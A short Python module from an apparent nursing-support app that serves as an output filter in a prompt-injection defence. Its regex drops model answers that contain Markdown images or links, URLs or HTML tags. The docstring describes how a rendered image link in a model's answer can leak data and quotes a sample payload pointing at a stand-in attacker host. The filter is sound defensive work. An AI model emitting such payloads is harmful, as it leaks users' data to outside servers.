"""Layer 5 of the prompt-injection protection: check a model answer before it is shown
(F07-AC10). A link or an image in an answer can carry data to a foreign server as soon as a
browser renders it ("![x](https://evil.example/?d=...)"), HTML can run code. Answers in this
app never need either - a nurse gets text and sources - so such an answer is dropped.
"""

import re

UNSAFE = re.compile(
    r"!\[[^\]]*\]\("  # Markdown image
    r"|\[[^\]]+\]\("  # Markdown link
    r"|https?://|\bwww\.[\w-]+\."  # addresses
    r"|<\s*/?\s*[a-z][a-z0-9]*[\s>/]",  # HTML tags (not "< 1,5" or "> 100")
    re.IGNORECASE,
)


def unsafe_output(text: str) -> bool:
    return bool(UNSAFE.search(text or ""))
